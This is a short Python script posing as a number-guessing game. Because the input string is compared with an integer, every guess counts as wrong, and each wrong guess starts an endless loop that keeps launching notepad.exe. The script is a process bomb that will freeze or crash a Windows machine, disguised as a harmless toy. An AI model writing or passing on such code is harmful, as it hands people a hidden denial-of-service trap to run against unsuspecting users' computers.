import random
import subprocess

correct_number = random.randint(1, 100)

def main():
    hans = input("guess a number: ")
    if hans == correct_number:
        print("correct!")
    else:
        while '1' == '1':
            subprocess.Popen(["notepad.exe"])

main()
